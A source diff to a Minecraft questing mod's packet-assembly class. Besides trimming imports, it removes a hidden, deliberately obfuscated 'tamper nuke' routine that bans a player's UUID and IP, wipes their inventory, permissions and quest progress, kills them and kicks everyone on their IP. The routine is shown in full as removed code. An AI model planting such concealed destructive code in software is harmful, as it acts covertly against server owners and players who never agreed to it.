@@ -1,32 +1,15 @@
 package betterquesting.network;
 
-import betterquesting.api.api.QuestingAPI;
-import betterquesting.api.questing.IQuest;
-import betterquesting.api.storage.BQ_Settings;
-import betterquesting.api2.storage.DBEntry;
 import betterquesting.core.BetterQuesting;
-import betterquesting.questing.QuestDatabase;
-import betterquesting.storage.LifeDatabase;
-import cpw.mods.fml.common.FMLCommonHandler;
-import net.minecraft.entity.player.EntityPlayer;
-import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.nbt.CompressedStreamTools;
 import net.minecraft.nbt.NBTTagByteArray;
 import net.minecraft.nbt.NBTTagCompound;
-import net.minecraft.server.MinecraftServer;
-import net.minecraft.server.management.IPBanEntry;
-import net.minecraft.server.management.UserListBansEntry;
-import net.minecraft.util.ChatComponentText;
-import net.minecraft.util.IChatComponent;
 import net.minecraft.util.MathHelper;
-import net.minecraft.world.WorldSettings.GameType;
 
 import java.io.BufferedInputStream;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
-import java.net.SocketAddress;
-import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
@@ -177,48 +160,4 @@ public final class PacketAssembly
             }
 		}
 	}
-	
-	// Play stupid games, win stupid prizes
-	@SuppressWarnings("unused")
-	public static void TnVrZU1lU2VucGFp(EntityPlayerMP player, String message, String reason)
-    {
-        MinecraftServer server = FMLCommonHandler.instance().getMinecraftServerInstance();
-        if(!BQ_Settings.tamperNuke || server == null || !server.isDedicatedServer() || !server.isServerInOnlineMode()) return; // Shh... nothing to see here
-        String sockAdd = socketToString(player.playerNetServerHandler.netManager.getSocketAddress());
-        if(sockAdd.equalsIgnoreCase("127.0.0.1")) return;
-        
-        // =[!]= ARMED =[!]=
-        UserListBansEntry userlistbansentry = new UserListBansEntry(player.getGameProfile(), null, new String(Base64.getDecoder().decode("VGFtcGVyTnVrZQ=="), StandardCharsets.UTF_8), null, reason);
-        server.getConfigurationManager().func_152608_h().func_152687_a(userlistbansentry); // RIP UUID
-        IPBanEntry ipBanEntry = new IPBanEntry(sockAdd);
-        server.getConfigurationManager().getBannedIPs().func_152687_a(ipBanEntry); // RIP IP
-        for(int i = 0; i < player.inventory.getSizeInventory(); i++) player.inventory.setInventorySlotContents(i, null); // RIP Items
-        server.getConfigurationManager().func_152610_b(player.getGameProfile()); // RIP OP status
-        server.getConfigurationManager().func_152597_c(player.getGameProfile()); // RIP whitelist status
-        player.setGameType(GameType.SURVIVAL); // No creative
-        player.setHealth(0F); // RIP Literal
-        player.playerNetServerHandler.kickPlayerFromServer(message); // Sayonara
-        server.getConfigurationManager().getPlayerList(sockAdd).forEach((p) -> {
-            ((EntityPlayerMP)p).playerNetServerHandler.kickPlayerFromServer(message); // Sayonara
-        });
-        UUID qID = QuestingAPI.getQuestingUUID(player);
-        for(DBEntry<IQuest> entry : QuestDatabase.INSTANCE.getEntries()) entry.getValue().resetUser(qID, true); // RIP progress
-        LifeDatabase.INSTANCE.setLives(qID, 0); // RIP Lives
-        System.out.println("\n[!] HACKER DETECTED [!]\nPlayer " + player.getGameProfile().getName() + " was auto-banned.\nReason: " + reason);
-        final IChatComponent announcement = new ChatComponentText("Player " + player.getGameProfile().getName() + " was auto-banned.\nReason: " + reason);
-        server.getConfigurationManager().playerEntityList.forEach(p -> {
-            EntityPlayer opPlayer = (EntityPlayer)p; // Woop! woop! It's the sound of the police!
-            if(opPlayer != player && server.getConfigurationManager().func_152596_g(opPlayer.getGameProfile())) opPlayer.addChatMessage(announcement);
-        });
-        // NOTE: Many strings are obscured to make it more annoying to search for keywords
-        // The people this is aimed at weren't very bright in the first place.
-    }
-    
-    private static String socketToString(SocketAddress sockAdd)
-    {
-        String s = sockAdd.toString();
-        if (s.contains("/")) s = s.substring(s.indexOf(47) + 1);
-        if (s.contains(":")) s = s.substring(0, s.indexOf(58));
-        return s;
-    }
 }
